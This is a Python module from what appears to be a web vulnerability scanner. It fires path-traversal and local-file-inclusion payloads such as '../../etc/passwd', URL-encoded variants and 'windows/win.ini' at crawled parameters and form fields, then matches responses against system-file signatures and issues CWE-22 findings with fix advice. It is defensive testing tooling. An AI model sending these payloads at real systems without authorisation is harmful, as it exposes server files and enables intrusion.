"""
Module 2 — Path Traversal / Local File Inclusion (LFI) Agent

Sends real traversal payloads (../../etc/passwd and its common encodings)
at any parameter whose name looks file/path-related, and any parameter at
all as a fallback, then greps the *actual* response body for content
signatures that only appear if the server actually returned a system file.
"""
from __future__ import annotations

import re

from .http_client import request, build_evidence

FILE_PARAM_HINTS = ("file", "path", "page", "template", "doc", "download", "include",
                    "filename", "folder", "dir", "img", "image", "load", "view", "content")

LINUX_PAYLOADS = [
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "..\\..\\..\\..\\etc\\passwd",
]
WINDOWS_PAYLOADS = [
    "../../../../windows/win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "..%2f..%2f..%2f..%2fwindows%2fwin.ini",
]

SIGNATURES = [
    ("Linux /etc/passwd", re.compile(r"root:.*:0:0:")),
    ("Windows win.ini", re.compile(r"\[fonts\]|\[extensions\]", re.I)),
]


def _looks_relevant(param_name: str) -> bool:
    low = param_name.lower()
    return any(h in low for h in FILE_PARAM_HINTS)


def _test_param(session, url, method, param, others):
    payloads = LINUX_PAYLOADS + WINDOWS_PAYLOADS
    for payload in payloads:
        data = {**{p: "1" for p in others}, param: payload}
        resp = request(session, "GET", url, params=data) if method == "GET" else request(session, "POST", url, data=data)
        if not resp.get("ok"):
            continue
        body = resp.get("body", "")
        for label, pattern in SIGNATURES:
            if pattern.search(body):
                return {
                    "rule_id": "PATH-TRAVERSAL-LFI",
                    "title": f"Path Traversal / Local File Inclusion ({label})",
                    "cwe": "CWE-22",
                    "severity": "critical",
                    "param": param,
                    "method": method,
                    "url": url,
                    "description": (
                        f"Injecting `{payload}` into '{param}' on {method} {url} returned real "
                        f"contents matching {label}, confirming the parameter is used to build a "
                        "filesystem path without sanitizing directory-traversal sequences."
                    ),
                    "recommendation": (
                        "Never build file paths from user input directly. Map input to a fixed "
                        "allow-list of filenames/IDs server-side, canonicalize and verify the "
                        "resolved path stays inside the intended base directory, and run the "
                        "process with least-privilege filesystem access."
                    ),
                    "evidence": build_evidence(f"{method} {url} ?{param}={payload!r}", resp,
                                                note=f"Response matched signature: {label}"),
                }
    return None


def run(session, target_report: dict, aggressive: bool = False) -> list:
    findings = []
    crawl = target_report.get("crawl", {})

    def gen_points():
        for qp in crawl.get("query_points", []):
            for param in qp["params"]:
                if aggressive or _looks_relevant(param):
                    others = [p for p in qp["params"] if p != param]
                    yield qp["url"], "GET", param, others
        for form in crawl.get("forms", []):
            names = [i["name"] for i in form["inputs"] if i["type"] not in ("submit", "button", "file")]
            for name in names:
                if aggressive or _looks_relevant(name):
                    others = [n for n in names if n != name]
                    yield form["action"], form["method"], name, others

    for url, method, param, others in gen_points():
        f = _test_param(session, url, method, param, others)
        if f:
            findings.append(f)
    return findings
